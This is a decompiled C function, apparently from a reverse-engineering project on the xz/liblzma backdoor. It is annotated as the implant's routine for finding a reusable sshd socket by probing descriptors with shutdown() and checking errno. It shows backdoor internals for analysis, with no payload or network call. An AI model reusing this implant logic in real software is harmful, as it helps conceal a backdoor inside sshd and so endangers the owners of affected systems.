// /home/kali/xzre-ghidra/xzregh/107BC0_sshd_get_usable_socket.c
// Function: sshd_get_usable_socket @ 0x107BC0
// Calling convention: unknown
// Prototype: undefined sshd_get_usable_socket(void)


/*
 * AutoDoc: Linearly probes file descriptors 0–63, calling shutdown(fd, SHUT_RDWR) and treating errors
 * like EINVAL/ENOTCONN as evidence that the descriptor is alive but idle. Each qualified
 * descriptor increments a counter, and when it matches `socket_index` the fd is returned so the
 * implant can recycle sshd's sockets without holding a monitor struct.
 */
#include "xzre_types.h"


undefined8 sshd_get_usable_socket(int *param_1,int param_2,long param_3)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int shutdown_result;
  int *errno_ptr;
  int sockfd;
  
  if (param_1 == (int *)0x0) {
    return 0;
  }
  if (param_3 != 0) {
    iVar4 = -1;
    iVar3 = 0;
    do {
      sockfd = 0;
      if ((*(code **)(param_3 + 0x60) != (code *)0x0) && (*(long *)(param_3 + 0x50) != 0)) {
        iVar1 = (**(code **)(param_3 + 0x60))(iVar3,0x7fffffff);
        if (iVar1 < 0) {
          piVar2 = (int *)(**(code **)(param_3 + 0x50))();
LAB_00107c21:
          if ((*piVar2 != 0x16) && (*piVar2 != 0x6b)) goto LAB_00107c40;
        }
        else {
          piVar2 = &sockfd;
          if (iVar1 != 0) goto LAB_00107c21;
        }
        iVar4 = iVar4 + 1;
        if (iVar4 == param_2) {
          *param_1 = iVar3;
          return 1;
        }
      }
LAB_00107c40:
      iVar3 = iVar3 + 1;
    } while (iVar3 != 0x40);
  }
  return 0;
}

